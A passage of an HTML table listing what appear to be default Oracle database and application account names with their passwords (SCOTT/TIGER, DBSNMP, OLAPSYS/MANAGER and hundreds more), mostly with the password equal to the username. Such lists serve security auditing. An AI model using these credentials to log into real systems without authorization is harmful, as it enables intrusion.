<td>CHANGE_ON_INSTALL</td>
</tr>
<tr>
<td>CTXTEST</td>
<td>CTXTEST</td>
</tr>
<tr>
<td>CUA</td>
<td>CUA</td>
</tr>
<tr>
<td>CUE</td>
<td>CUE</td>
</tr>
<tr>
<td>CUF</td>
<td>CUF</td>
</tr>
<tr>
<td>CUG</td>
<td>CUG</td>
</tr>
<tr>
<td>CUI</td>
<td>CUI</td>
</tr>
<tr>
<td>CUN</td>
<td>CUN</td>
</tr>
<tr>
<td>CUP</td>
<td>CUP</td>
</tr>
<tr>
<td>CUS</td>
<td>CUS</td>
</tr>
<tr>
<td>CZ</td>
<td>CZ</td>
</tr>
<tr>
<td>DAVIDMORGAN</td>
<td>DAVIDMORGAN</td>
</tr>
<tr>
<td>DBSNMP</td>
<td>DBSNMP</td>
</tr>
<tr>
<td>DCM</td>
<td>DCM</td>
</tr>
<tr>
<td>DD7333</td>
<td>DD7333</td>
</tr>
<tr>
<td>DD7334</td>
<td>DD7334</td>
</tr>
<tr>
<td>DD810</td>
<td>DD810</td>
</tr>
<tr>
<td>DD811</td>
<td>DD811</td>
</tr>
<tr>
<td>DD812</td>
<td>DD812</td>
</tr>
<tr>
<td>DD9</td>
<td>DD9</td>
</tr>
<tr>
<td>DDB733</td>
<td>DDB733</td>
</tr>
<tr>
<td>DDD</td>
<td>DDD</td>
</tr>
<tr>
<td>DEMO8</td>
<td>DEMO8</td>
</tr>
<tr>
<td>DES</td>
<td>DES</td>
</tr>
<tr>
<td>DES2K</td>
<td>DES2K</td>
</tr>
<tr>
<td>DEV2000_DEMOS</td>
<td>DEV2000_DEMOS</td>
</tr>
<tr>
<td>DEVB733</td>
<td>DEVB733</td>
</tr>
<tr>
<td>DEVUSER</td>
<td>DEVUSER</td>
</tr>
<tr>
<td>DGRAY</td>
<td>WELCOME</td>
</tr>
<tr>
<td>DIP</td>
<td>DIP</td>
</tr>
<tr>
<td>DISCOVERER5</td>
<td>DISCOVERER5</td>
</tr>
<tr>
<td>DKING</td>
<td>DKING</td>
</tr>
<tr>
<td>DLD</td>
<td>DLD</td>
</tr>
<tr>
<td>DMADMIN</td>
<td>MANAGER</td>
</tr>
<tr>
<td>DMATS</td>
<td>DMATS</td>
</tr>
<tr>
<td>DMS</td>
<td>DMS</td>
</tr>
<tr>
<td>DMSYS</td>
<td>DMSYS</td>
</tr>
<tr>
<td>DOM</td>
<td>DOM</td>
</tr>
<tr>
<td>DPOND</td>
<td>DPOND</td>
</tr>
<tr>
<td>DSGATEWAY</td>
<td>DSGATEWAY</td>
</tr>
<tr>
<td>DV7333</td>
<td>DV7333</td>
</tr>
<tr>
<td>DV7334</td>
<td>DV7334</td>
</tr>
<tr>
<td>DV810</td>
<td>DV810</td>
</tr>
<tr>
<td>DV811</td>
<td>DV811</td>
</tr>
<tr>
<td>DV812</td>
<td>DV812</td>
</tr>
<tr>
<td>DV9</td>
<td>DV9</td>
</tr>
<tr>
<td>DVP1</td>
<td>DVP1</td>
</tr>
<tr>
<td>EAA</td>
<td>EAA</td>
</tr>
<tr>
<td>EAM</td>
<td>EAM</td>
</tr>
<tr>
<td>EC</td>
<td>EC</td>
</tr>
<tr>
<td>ECX</td>
<td>ECX</td>
</tr>
<tr>
<td>EDR</td>
<td>EDR</td>
</tr>
<tr>
<td>EDWEUL_US</td>
<td>EDWEUL_US</td>
</tr>
<tr>
<td>EDWREP</td>
<td>EDWREP</td>
</tr>
<tr>
<td>EGC1</td>
<td>EGC1</td>
</tr>
<tr>
<td>EGD1</td>
<td>EGD1</td>
</tr>
<tr>
<td>EGM1</td>
<td>EGM1</td>
</tr>
<tr>
<td>EGO</td>
<td>EGO</td>
</tr>
<tr>
<td>EGR1</td>
<td>EGR1</td>
</tr>
<tr>
<td>END1</td>
<td>END1</td>
</tr>
<tr>
<td>ENG</td>
<td>ENG</td>
</tr>
<tr>
<td>ENI</td>
<td>ENI</td>
</tr>
<tr>
<td>ENM1</td>
<td>ENM1</td>
</tr>
<tr>
<td>ENS1</td>
<td>ENS1</td>
</tr>
<tr>
<td>ENTMGR_CUST</td>
<td>ENTMGR_CUST</td>
</tr>
<tr>
<td>ENTMGR_PRO</td>
<td>ENTMGR_PRO</td>
</tr>
<tr>
<td>ENTMGR_TRAIN</td>
<td>ENTMGR_TRAIN</td>
</tr>
<tr>
<td>EOPP_PORTALADM</td>
<td>EOPP_PORTALADM</td>
</tr>
<tr>
<td>EOPP_PORTALMGR</td>
<td>EOPP_PORTALMGR</td>
</tr>
<tr>
<td>EOPP_USER</td>
<td>EOPP_USER</td>
</tr>
<tr>
<td>EUL_US</td>
<td>EUL_US</td>
</tr>
<tr>
<td>EVM</td>
<td>EVM</td>
</tr>
<tr>
<td>EXA1</td>
<td>EXA1</td>
</tr>
<tr>
<td>EXA2</td>
<td>EXA2</td>
</tr>
<tr>
<td>EXA3</td>
<td>EXA3</td>
</tr>
<tr>
<td>EXA4</td>
<td>EXA4</td>
</tr>
<tr>
<td>EXFSYS</td>
<td>EXFSYS</td>
</tr>
<tr>
<td>EXS1</td>
<td>EXS1</td>
</tr>
<tr>
<td>EXS2</td>
<td>EXS2</td>
</tr>
<tr>
<td>EXS3</td>
<td>EXS3</td>
</tr>
<tr>
<td>EXS4</td>
<td>EXS4</td>
</tr>
<tr>
<td>FA</td>
<td>FA</td>
</tr>
<tr>
<td>FEM</td>
<td>FEM</td>
</tr>
<tr>
<td>FIA1</td>
<td>FIA1</td>
</tr>
<tr>
<td>FII</td>
<td>FII</td>
</tr>
<tr>
<td>FLM</td>
<td>FLM</td>
</tr>
<tr>
<td>FNI1</td>
<td>FNI1</td>
</tr>
<tr>
<td>FNI2</td>
<td>FNI2</td>
</tr>
<tr>
<td>FPA</td>
<td>FPA</td>
</tr>
<tr>
<td>FPT</td>
<td>FPT</td>
</tr>
<tr>
<td>FRM</td>
<td>FRM</td>
</tr>
<tr>
<td>FTA1</td>
<td>FTA1</td>
</tr>
<tr>
<td>FTE</td>
<td>FTE</td>
</tr>
<tr>
<td>FUN</td>
<td>FUN</td>
</tr>
<tr>
<td>FV</td>
<td>FV</td>
</tr>
<tr>
<td>FVP1</td>
<td>FVP1</td>
</tr>
<tr>
<td>GALLEN</td>
<td>GALLEN</td>
</tr>
<tr>
<td>GCA1</td>
<td>GCA1</td>
</tr>
<tr>
<td>GCA2</td>
<td>GCA2</td>
</tr>
<tr>
<td>GCA3</td>
<td>GCA3</td>
</tr>
<tr>
<td>GCA9</td>
<td>GCA9</td>
</tr>
<tr>
<td>GCMGR1</td>
<td>GCMGR1</td>
</tr>
<tr>
<td>GCMGR2</td>
<td>GCMGR2</td>
</tr>
<tr>
<td>GCMGR3</td>
<td>GCMGR3</td>
</tr>
<tr>
<td>GCS</td>
<td>GCS</td>
</tr>
<tr>
<td>GCS1</td>
<td>GCS1</td>
</tr>
<tr>
<td>GCS2</td>
<td>GCS2</td>
</tr>
<tr>
<td>GCS3</td>
<td>GCS3</td>
</tr>
<tr>
<td>GEORGIAWINE</td>
<td>GEORGIAWINE</td>
</tr>
<tr>
<td>GL</td>
<td>GL</td>
</tr>
<tr>
<td>GLA1</td>
<td>GLA1</td>
</tr>
<tr>
<td>GLA2</td>
<td>GLA2</td>
</tr>
<tr>
<td>GLA3</td>
<td>GLA3</td>
</tr>
<tr>
<td>GLA4</td>
<td>GLA4</td>
</tr>
<tr>
<td>GLS1</td>
<td>GLS1</td>
</tr>
<tr>
<td>GLS2</td>
<td>GLS2</td>
</tr>
<tr>
<td>GLS3</td>
<td>GLS3</td>
</tr>
<tr>
<td>GLS4</td>
<td>GLS4</td>
</tr>
<tr>
<td>GM_AWDA</td>
<td>GM_AWDA</td>
</tr>
<tr>
<td>GM_COPI</td>
<td>GM_COPI</td>
</tr>
<tr>
<td>GM_DPHD</td>
<td>GM_DPHD</td>
</tr>
<tr>
<td>GM_MLCT</td>
<td>GM_MLCT</td>
</tr>
<tr>
<td>GM_PLADMA</td>
<td>GM_PLADMA</td>
</tr>
<tr>
<td>GM_PLADMH</td>
<td>GM_PLADMH</td>
</tr>
<tr>
<td>GM_PLCCA</td>
<td>GM_PLCCA</td>
</tr>
<tr>
<td>GM_PLCCH</td>
<td>GM_PLCCH</td>
</tr>
<tr>
<td>GM_PLCOMA</td>
<td>GM_PLCOMA</td>
</tr>
<tr>
<td>GM_PLCOMH</td>
<td>GM_PLCOMH</td>
</tr>
<tr>
<td>GM_PLCONA</td>
<td>GM_PLCONA</td>
</tr>
<tr>
<td>GM_PLCONH</td>
<td>GM_PLCONH</td>
</tr>
<tr>
<td>GM_PLNSCA</td>
<td>GM_PLNSCA</td>
</tr>
<tr>
<td>GM_PLNSCH</td>
<td>GM_PLNSCH</td>
</tr>
<tr>
<td>GM_PLSCTA</td>
<td>GM_PLSCTA</td>
</tr>
<tr>
<td>GM_PLSCTH</td>
<td>GM_PLSCTH</td>
</tr>
<tr>
<td>GM_PLVET</td>
<td>GM_PLVET</td>
</tr>
<tr>
<td>GM_SPO</td>
<td>GM_SPO</td>
</tr>
<tr>
<td>GM_STKH</td>
<td>GM_STKH</td>
</tr>
<tr>
<td>GMA</td>
<td>GMA</td>
</tr>
<tr>
<td>GMD</td>
<td>GMD</td>
</tr>
<tr>
<td>GME</td>
<td>GME</td>
</tr>
<tr>
<td>GMF</td>
<td>GMF</td>
</tr>
<tr>
<td>GMI</td>
<td>GMI</td>
</tr>
<tr>
<td>GML</td>
<td>GML</td>
</tr>
<tr>
<td>GMP</td>
<td>GMP</td>
</tr>
<tr>
<td>GMS</td>
<td>GMS</td>
</tr>
<tr>
<td>GR</td>
<td>GR</td>
</tr>
<tr>
<td>GUEST</td>
<td>GUEST</td>
</tr>
<tr>
<td>HCC</td>
<td>HCC</td>
</tr>
<tr>
<td>HHCFO</td>
<td>HHCFO</td>
</tr>
<tr>
<td>HR</td>
<td>HR</td>
</tr>
<tr>
<td>HRI</td>
<td>HRI</td>
</tr>
<tr>
<td>HXC</td>
<td>HXC</td>
</tr>
<tr>
<td>HXT</td>
<td>HXT</td>
</tr>
<tr>
<td>IA</td>
<td>IA</td>
</tr>
<tr>
<td>IBA</td>
<td>IBA</td>
</tr>
<tr>
<td>IBC</td>
<td>IBC</td>
</tr>
<tr>
<td>IBE</td>
<td>IBE</td>
</tr>
<tr>
<td>IBP</td>
<td>IBP</td>
</tr>
<tr>
<td>IBU</td>
<td>IBU</td>
</tr>
<tr>
<td>IBY</td>
<td>IBY</td>
</tr>
<tr>
<td>ICX</td>
<td>ICX</td>
</tr>
<tr>
<td>IEB</td>
<td>IEB</td>
</tr>
<tr>
<td>IEC</td>
<td>IEC</td>
</tr>
<tr>
<td>IEM</td>
<td>IEM</td>
</tr>
<tr>
<td>IEO</td>
<td>IEO</td>
</tr>
<tr>
<td>IES</td>
<td>IES</td>
</tr>
<tr>
<td>IEU</td>
<td>IEU</td>
</tr>
<tr>
<td>IEX</td>
<td>IEX</td>
</tr>
<tr>
<td>IGC</td>
<td>IGC</td>
</tr>
<tr>
<td>IGF</td>
<td>IGF</td>
</tr>
<tr>
<td>IGI</td>
<td>IGI</td>
</tr>
<tr>
<td>IGS</td>
<td>IGS</td>
</tr>
<tr>
<td>IGW</td>
<td>IGW</td>
</tr>
<tr>
<td>IMC</td>
<td>IMC</td>
</tr>
<tr>
<td>IMT</td>
<td>IMT</td>
</tr>
<tr>
<td>INS1</td>
<td>INS1</td>
</tr>
<tr>
<td>INS2</td>
<td>INS2</td>
</tr>
<tr>
<td>INTERNET_APPSERVER_REGISTRY</td>
<td>INTERNET_APPSERVER_REGISTRY</td>
</tr>
<tr>
<td>INV</td>
<td>INV</td>
</tr>
<tr>
<td>IP</td>
<td>IP</td>
</tr>
<tr>
<td>IPA</td>
<td>IPA</td>
</tr>
<tr>
<td>IPD</td>
<td>IPD</td>
</tr>
<tr>
<td>ISC</td>
<td>ISC</td>
</tr>
<tr>
<td>ISTEWARD</td>
<td>ISTEWARD</td>
</tr>
<tr>
<td>ITG</td>
<td>ITG</td>
</tr>
<tr>
<td>JA</td>
<td>JA</td>
</tr>
<tr>
<td>JD7333</td>
<td>JD7333</td>
</tr>
<tr>
<td>JD7334</td>
<td>JD7334</td>
</tr>
<tr>
<td>JD9</td>
<td>JD9</td>
</tr>
<tr>
<td>JDE</td>
<td>JDE</td>
</tr>
<tr>
<td>JDEDBA</td>
<td>JDEDBA</td>
</tr>
<tr>
<td>JE</td>
<td>JE</td>
</tr>
<tr>
<td>JG</td>
<td>JG</td>
</tr>
<tr>
<td>JL</td>
<td>JL</td>
</tr>
<tr>
<td>JOHNINARI</td>
<td>JOHNINARI</td>
</tr>
<tr>
<td>JONES</td>
<td>STEEL</td>
</tr>
<tr>
<td>JTF</td>
<td>JTF</td>
</tr>
<tr>
<td>JTI</td>
<td>JTI</td>
</tr>
<tr>
<td>JTM</td>
<td>JTM</td>
</tr>
<tr>
<td>JTR</td>
<td>JTR</td>
</tr>
<tr>
<td>JTS</td>
<td>JTS</td>
</tr>
<tr>
<td>JUNK_PS</td>
<td>JUNK_PS</td>
</tr>
<tr>
<td>JUSTOSHUM</td>
<td>JUSTOSHUM</td>
</tr>
<tr>
<td>KELLYJONES</td>
<td>KELLYJONES</td>
</tr>
<tr>
<td>KEVINDONS</td>
<td>KEVINDONS</td>
</tr>
<tr>
<td>KPN</td>
<td>KPN</td>
</tr>
<tr>
<td>LADAMS</td>
<td>LADAMS</td>
</tr>
<tr>
<td>LBA</td>
<td>LBA</td>
</tr>
<tr>
<td>LBACSYS</td>
<td>LBACSYS</td>
</tr>
<tr>
<td>LDQUAL</td>
<td>LDQUAL</td>
</tr>
<tr>
<td>LHILL</td>
<td>LHILL</td>
</tr>
<tr>
<td>LNS</td>
<td>LNS</td>
</tr>
<tr>
<td>LQUINCY</td>
<td>LQUINCY</td>
</tr>
<tr>
<td>LSA</td>
<td>LSA</td>
</tr>
<tr>
<td>MDDATA</td>
<td>MDDATA</td>
</tr>
<tr>
<td>MDSYS</td>
<td>MDSYS</td>
</tr>
<tr>
<td>ME</td>
<td>ME</td>
</tr>
<tr>
<td>MFG</td>
<td>MFG</td>
</tr>
<tr>
<td>MGR1</td>
<td>MGR1</td>
</tr>
<tr>
<td>MGR2</td>
<td>MGR2</td>
</tr>
<tr>
<td>MGR3</td>
<td>MGR3</td>
</tr>
<tr>
<td>MGR4</td>
<td>MGR4</td>
</tr>
<tr>
<td>MIKEIKEGAMI</td>
<td>MIKEIKEGAMI</td>
</tr>
<tr>
<td>MJONES</td>
<td>MJONES</td>
</tr>
<tr>
<td>MLAKE</td>
<td>MLAKE</td>
</tr>
<tr>
<td>MM1</td>
<td>MM1</td>
</tr>
<tr>
<td>MM2</td>
<td>MM2</td>
</tr>
<tr>
<td>MM3</td>
<td>MM3</td>
</tr>
<tr>
<td>MM4</td>
<td>MM4</td>
</tr>
<tr>
<td>MM5</td>
<td>MM5</td>
</tr>
<tr>
<td>MMARTIN</td>
<td>MMARTIN</td>
</tr>
<tr>
<td>MOBILEADMIN</td>
<td>WELCOME</td>
</tr>
<tr>
<td>MRP</td>
<td>MRP</td>
</tr>
<tr>
<td>MSC</td>
<td>MSC</td>
</tr>
<tr>
<td>MSD</td>
<td>MSD</td>
</tr>
<tr>
<td>MSO</td>
<td>MSO</td>
</tr>
<tr>
<td>MSR</td>
<td>MSR</td>
</tr>
<tr>
<td>MST</td>
<td>MST</td>
</tr>
<tr>
<td>MWA</td>
<td>MWA</td>
</tr>
<tr>
<td>NEILKATSU</td>
<td>NEILKATSU</td>
</tr>
<tr>
<td>OBJ7333</td>
<td>OBJ7333</td>
</tr>
<tr>
<td>OBJ7334</td>
<td>OBJ7334</td>
</tr>
<tr>
<td>OBJB733</td>
<td>OBJB733</td>
</tr>
<tr>
<td>OCA</td>
<td>OCA</td>
</tr>
<tr>
<td>ODM</td>
<td>ODM</td>
</tr>
<tr>
<td>ODM_MTR</td>
<td>MTRPW</td>
</tr>
<tr>
<td>ODS</td>
<td>ODS</td>
</tr>
<tr>
<td>ODSCOMMON</td>
<td>ODSCOMMON</td>
</tr>
<tr>
<td>OE</td>
<td>OE</td>
</tr>
<tr>
<td>OKB</td>
<td>OKB</td>
</tr>
<tr>
<td>OKC</td>
<td>OKC</td>
</tr>
<tr>
<td>OKE</td>
<td>OKE</td>
</tr>
<tr>
<td>OKI</td>
<td>OKI</td>
</tr>
<tr>
<td>OKL</td>
<td>OKL</td>
</tr>
<tr>
<td>OKO</td>
<td>OKO</td>
</tr>
<tr>
<td>OKR</td>
<td>OKR</td>
</tr>
<tr>
<td>OKS</td>
<td>OKS</td>
</tr>
<tr>
<td>OKX</td>
<td>OKX</td>
</tr>
<tr>
<td>OL810</td>
<td>OL810</td>
</tr>
<tr>
<td>OL811</td>
<td>OL811</td>
</tr>
<tr>
<td>OL812</td>
<td>OL812</td>
</tr>
<tr>
<td>OL9</td>
<td>OL9</td>
</tr>
<tr>
<td>OLAPSYS</td>
<td>MANAGER</td>
</tr>
<tr>
<td>ONT</td>
<td>ONT</td>
</tr>
<tr>
<td>OPI</td>
<td>OPI</td>
</tr>
<tr>
<td>ORABAM</td>
<td>ORABAM</td>
</tr>
<tr>
<td>ORABAMSAMPLES</td>
<td>ORABAMSAMPLES</td>
</tr>
<tr>
<td>ORABPEL</td>
<td>ORABPEL</td>
</tr>
<tr>
<td>ORAESB</td>
<td>ORAESB</td>
</tr>
<tr>
<td>ORAOCA_PUBLIC</td>
<td>ORAOCA_PUBLIC</td>
</tr>
<tr>
<td>ORASAGENT</td>
<td>ORASAGENT</td>
</tr>
<tr>
<td>ORASSO</td>
<td>ORASSO</td>
</tr>
<tr>
<td>ORASSO_DS</td>
<td>ORASSO_DS</td>
</tr>
<tr>
<td>ORASSO_PA</td>
<td>ORASSO_PA</td>
</tr>
<tr>
<td>ORASSO_PS</td>
<td>ORASSO_PS</td>
</tr>
<tr>
<td>ORASSO_PUBLIC</td>
<td>ORASSO_PUBLIC</td>
</tr>
<tr>
<td>ORDPLUGINS</td>
<td>ORDPLUGINS</td>
</tr>
<tr>
<td>ORDSYS</td>
<td>ORDSYS</td>
</tr>
<tr>
<td>OSM</td>
<td>OSM</td>
</tr>
<tr>
<td>OTA</td>
<td>OTA</td>
</tr>
<tr>
<td>OUTLN</td>
<td>OUTLN</td>
</tr>
<tr>
<td>OWAPUB</td>
<td>OWAPUB</td>
</tr>
<tr>
<td>OWF_MGR</td>
<td>OWF_MGR</td>
</tr>
<tr>
<td>OZF</td>
<td>OZF</td>
</tr>
<tr>
<td>OZP</td>
<td>OZP</td>
</tr>
<tr>
<td>OZS</td>
<td>OZS</td>
</tr>
<tr>
<td>PA</td>
<td>PA</td>
</tr>
<tr>
<td>PABLO</td>
<td>PABLO</td>
</tr>
<tr>
<td>PAIGE</td>
<td>PAIGE</td>
</tr>
<tr>
<td>PAM</td>
<td>PAM</td>
</tr>
<tr>
<td>PARRISH</td>
<td>PARRISH</td>
</tr>
<tr>
<td>PARSON</td>
<td>PARSON</td>
</tr>
<tr>
<td>PAT</td>
<td>PAT</td>
</tr>
<tr>
<td>PATORILY</td>
<td>PATORILY</td>
</tr>
<tr>
<td>PATRICKSANCHEZ</td>
<td>PATRICKSANCHEZ</td>
</tr>
<tr>
<td>PATSY</td>
<td>PATSY</td>
</tr>
<tr>
<td>PAUL</td>
<td>PAUL</td>
</tr>
<tr>
<td>PAULA</td>
<td>PAULA</td>
</tr>
<tr>
<td>PAXTON</td>
<td>PAXTON</td>
</tr>
<tr>
<td>PCA1</td>
<td>PCA1</td>
</tr>
<tr>
<td>PCA2</td>
<td>PCA2</td>
</tr>
<tr>
<td>PCA3</td>
<td>PCA3</td>
</tr>
<tr>
<td>PCA4</td>
<td>PCA4</td>
</tr>
<tr>
<td>PCS1</td>
<td>PCS1</td>
</tr>
<tr>
<td>PCS2</td>
<td>PCS2</td>
</tr>
<tr>
<td>PCS3</td>
<td>PCS3</td>
</tr>
<tr>
<td>PCS4</td>
<td>PCS4</td>
</tr>
<tr>
<td>PD7333</td>
<td>PD7333</td>
</tr>
<tr>
<td>PD7334</td>
<td>PD7334</td>
</tr>
<tr>
<td>PD810</td>
<td>PD810</td>
</tr>
<tr>
<td>PD811</td>
<td>PD811</td>
</tr>
<tr>
<td>PD812</td>
<td>PD812</td>
</tr>
<tr>
<td>PD9</td>
<td>PD9</td>
</tr>
<tr>
<td>PDA1</td>
<td>PDA1</td>
</tr>
<tr>
<td>PEARL</td>
<td>PEARL</td>
</tr>
<tr>
<td>PEG</td>
<td>PEG</td>
</tr>
<tr>
<td>PENNY</td>
<td>PENNY</td>
</tr>
<tr>
<td>PERCY</td>
<td>PERCY</td>
</tr>
<tr>
<td>PERRY</td>
<td>PERRY</td>
</tr>
<tr>
<td>PETE</td>
<td>PETE</td>
</tr>
<tr>
<td>PEYTON</td>
<td>PEYTON</td>
</tr>
<tr>
<td>PHIL</td>
<td>PHIL</td>
</tr>
<tr>
<td>PJI</td>
<td>PJI</td>
</tr>
<tr>
<td>PJM</td>
<td>PJM</td>
</tr>
<tr>
<td>PMI</td>
<td>PMI</td>
</tr>
<tr>
<td>PN</td>
<td>PN</td>
</tr>
<tr>
<td>PO</td>
<td>PO</td>
</tr>
<tr>
<td>POA</td>
<td>POA</td>
</tr>
<tr>
<td>POLLY</td>
<td>POLLY</td>
</tr>
<tr>
<td>POM</td>
<td>POM</td>
</tr>
<tr>
<td>PON</td>
<td>PON</td>
</tr>
<tr>
<td>PORTAL</td>
<td>PORTAL</td>
</tr>
<tr>
<td>PORTAL_APP</td>
<td>PORTAL_APP</td>
</tr>
<tr>
<td>PORTAL_DEMO</td>
<td>PORTAL_DEMO</td>
</tr>
<tr>
<td>PORTAL_PUBLIC</td>
<td>PORTAL_PUBLIC</td>
</tr>
<tr>
<td>PORTAL30</td>
<td>PORTAL30</td>
</tr>
<tr>
<td>PORTAL30_DEMO</td>
<td>PORTAL30_DEMO</td>
</tr>
<tr>
<td>PORTAL30_PUBLIC</td>
<td>PORTAL30_PUBLIC</td>
</tr>
<tr>
<td>PORTAL30_SSO</td>
<td>PORTAL30_SSO</td>
</tr>
<tr>
<td>PORTAL30_SSO_PS</td>
<td>PORTAL30_SSO_PS</td>
</tr>
<tr>
<td>PORTAL30_SSO_PUBLIC</td>
<td>PORTAL30_SSO_PUBLIC</td>
</tr>
<tr>
<td>POS</td>
<td>POS</td>
</tr>
<tr>
<td>PPM1</td>
<td>PPM1</td>
</tr>
<tr>
<td>PPM2</td>
<td>PPM2</td>
</tr>
<tr>
<td>PPM3</td>
<td>PPM3</td>
</tr>
<tr>
<td>PPM4</td>
<td>PPM4</td>
</tr>
<tr>
<td>PPM5</td>
<td>PPM5</td>
</tr>
<tr>
<td>PRISTB733</td>
<td>PRISTB733</td>
</tr>
<tr>
<td>PRISTCTL</td>
<td>PRISTCTL</td>
</tr>
<tr>
<td>PRISTDTA</td>
<td>PRISTDTA</td>
</tr>
<tr>
<td>PRODB733</td>
<td>PRODB733</td>
</tr>
<tr>
<td>PRODCTL</td>
<td>PRODCTL</td>
</tr>
<tr>
<td>PRODDTA</td>
<td>PRODDTA</td>
</tr>
<tr>
<td>PRODUSER</td>
<td>PRODUSER</td>
</tr>
<tr>
<td>PROJMFG</td>
<td>WELCOME</td>
</tr>
<tr>
<td>PRP</td>
<td>PRP</td>
</tr>
<tr>
<td>PS</td>
<td>PS</td>
</tr>
<tr>
<td>PS810</td>
<td>PS810</td>
</tr>
<tr>
<td>PS810CTL</td>
<td>PS810CTL</td>
</tr>
<tr>
<td>PS810DTA</td>
<td>PS810DTA</td>
</tr>
<tr>
<td>PS811</td>
<td>PS811</td>
</tr>
<tr>
<td>PS811CTL</td>
<td>PS811CTL</td>
</tr>
<tr>
<td>PS811DTA</td>
<td>PS811DTA</td>
</tr>
<tr>
<td>PS812</td>
<td>PS812</td>
</tr>
<tr>
<td>PS812CTL</td>
<td>PS812CTL</td>
</tr>
<tr>
<td>PS812DTA</td>
<td>PS812DTA</td>
</tr>
<tr>
<td>PSA</td>
<td>PSA</td>
</tr>
<tr>
<td>PSB</td>
<td>PSB</td>
</tr>
<tr>
<td>PSBASS</td>
<td>PSBASS</td>
</tr>
<tr>
<td>PSEM</td>
<td>PSEM</td>
</tr>
<tr>
<td>PSFT</td>
<td>PSFT</td>
</tr>
<tr>
<td>PSFTDBA</td>
<td>PSFTDBA</td>
</tr>
<tr>
<td>PSP</td>
<td>PSP</td>
</tr>
<tr>
<td>PTADMIN</td>
<td>PTADMIN</td>
</tr>
<tr>
<td>PTCNE</td>
<td>PTCNE</td>
</tr>
<tr>
<td>PTDMO</td>
<td>PTDMO</td>
</tr>
<tr>
<td>PTE</td>
<td>PTE</td>
</tr>
<tr>
<td>PTESP</td>
<td>PTESP</td>
</tr>
<tr>
<td>PTFRA</td>
<td>PTFRA</td>
</tr>
<tr>
<td>PTG</td>
<td>PTG</td>
</tr>
<tr>
<td>PTGER</td>
<td>PTGER</td>
</tr>
<tr>
<td>PTJPN</td>
<td>PTJPN</td>
</tr>
<tr>
<td>PTUKE</td>
<td>PTUKE</td>
</tr>
<tr>
<td>PTUPG</td>
<td>PTUPG</td>
</tr>
<tr>
<td>PTWEB</td>
<td>PTWEB</td>
</tr>
<tr>
<td>PTWEBSERVER</td>
<td>PTWEBSERVER</td>
</tr>
<tr>
<td>PV</td>
<td>PV</td>
</tr>
<tr>
<td>PY7333</td>
<td>PY7333</td>
</tr>
<tr>
<td>PY7334</td>
<td>PY7334</td>
</tr>
<tr>
<td>PY810</td>
<td>PY810</td>
</tr>
<tr>
<td>PY811</td>
<td>PY811</td>
</tr>
<tr>
<td>PY812</td>
<td>PY812</td>
</tr>
<tr>
<td>PY9</td>
<td>PY9</td>
</tr>
<tr>
<td>QA</td>
<td>QA</td>
</tr>
<tr>
<td>QOT</td>
<td>QOT</td>
</tr>
<tr>
<td>QP</td>
<td>QP</td>
</tr>
<tr>
<td>QRM</td>
<td>QRM</td>
</tr>
<tr>
<td>QS</td>
<td>QS</td>
</tr>
<tr>
<td>QS_ADM</td>
<td>QS_ADM</td>
</tr>
<tr>
<td>QS_CB</td>
<td>QS_CB</td>
</tr>
<tr>
<td>QS_CBADM</td>
<td>QS_CBADM</td>
</tr>
<tr>
<td>QS_CS</td>
<td>QS_CS</td>
</tr>
<tr>
<td>QS_ES</td>
<td>QS_ES</td>
</tr>
<tr>
<td>QS_OS</td>
<td>QS_OS</td>
</tr>
<tr>
<td>QS_WS</td>
<td>QS_WS</td>
</tr>
<tr>
<td>RENE</td>
<td>RENE</td>
</tr>
<tr>
<td>REPADMIN</td>
<td>REPADMIN</td>
</tr>
<tr>
<td>REPORTS</td>
<td>REPORTS</td>
</tr>
<tr>
<td>REPORTS_USER</td>
<td>OEM_TEMP</td>
</tr>
<tr>
<td>RESTRICTED_US</td>
<td>RESTRICTED_US</td>
</tr>
<tr>
<td>RG</td>
<td>RG</td>
</tr>
<tr>
<td>RHX</td>
<td>RHX</td>
</tr>
<tr>
<td>RLA</td>
<td>RLA</td>
</tr>
<tr>
<td>RLM</td>
<td>RLM</td>
</tr>
<tr>
<td>RM1</td>
<td>RM1</td>
</tr>
<tr>
<td>RM2</td>
<td>RM2</td>
</tr>
<tr>
<td>RM3</td>
<td>RM3</td>
</tr>
<tr>
<td>RM4</td>
<td>RM4</td>
</tr>
<tr>
<td>RM5</td>
<td>RM5</td>
</tr>
<tr>
<td>RMAN</td>
<td>RMAN</td>
</tr>
<tr>
<td>ROB</td>
<td>ROB</td>
</tr>
<tr>
<td>RPARKER</td>
<td>RPARKER</td>
</tr>
<tr>
<td>RWA1</td>
<td>RWA1</td>
</tr>
<tr>
<td>SALLYH</td>
<td>SALLYH</td>
</tr>
<tr>
<td>SAM</td>
<td>SAM</td>
</tr>
<tr>
<td>SARAHMANDY</td>
<td>SARAHMANDY</td>
</tr>
<tr>
<td>SCM1</td>
<td>SCM1</td>
</tr>
<tr>
<td>SCM2</td>
<td>SCM2</td>
</tr>
<tr>
<td>SCM3</td>
<td>SCM3</td>
</tr>
<tr>
<td>SCM4</td>
<td>SCM4</td>
</tr>
<tr>
<td>SCOTT</td>
<td>TIGER</td>
</tr>
<tr>
<td>SDAVIS</td>
<td>SDAVIS</td>
</tr>
<tr>
<td>SECDEMO</td>
<td>SECDEMO</td>
</tr>
<tr>
<td>SEDWARDS</td>
<td>SEDWARDS</td>
</tr>
<tr>
<td>SELLCM</td>
<td>SELLCM</td>
</tr>
<tr>
<td>SELLER</td>
<td>SELLER</td>
</tr>
<tr>
<td>SELLTREAS</td>
<td>SELLTREAS</td>
</tr>
<tr>
<td>SERVICES</td>
<td>WELCOME</td>
</tr>
<tr>
<td>SETUP</td>
<td>SETUP</td>
</tr>
<tr>
<td>SH</td>
<td>SH</td>
</tr>
<tr>
<td>SI_INFORMTN_SCHEMA</td>
<td>SI_INFORMTN_SCHEMA</td>
</tr>
<tr>
<td>SID</td>
<td>SID</td>
</tr>
<tr>
<td>SKAYE</td>
<td>SKAYE</td>
</tr>
<tr>
<td>SKYTETSUKA</td>
<td>SKYTETSUKA</td>
</tr>
<tr>
<td>SLSAA</td>
<td>SLSAA</td>
</tr>
<tr>
<td>SLSMGR</td>
<td>SLSMGR</td>
</tr>
<tr>
<td>SLSREP</td>
<td>SLSREP</td>
</tr>
<tr>
<td>SRABBITT</td>
<td>SRABBITT</td>
</tr>
<tr>
<td>SRALPHS</td>
<td>SRALPHS</td>
</tr>
<tr>
<td>SRAY</td>
<td>SRAY</td>
</tr>
<tr>
<td>SRIVERS</td>
<td>SRIVERS</td>
</tr>
<tr>
<td>SSA1</td>
<td>SSA1</td>
</tr>
<tr>
<td>SSA2</td>
<td>SSA2</td>
</tr>
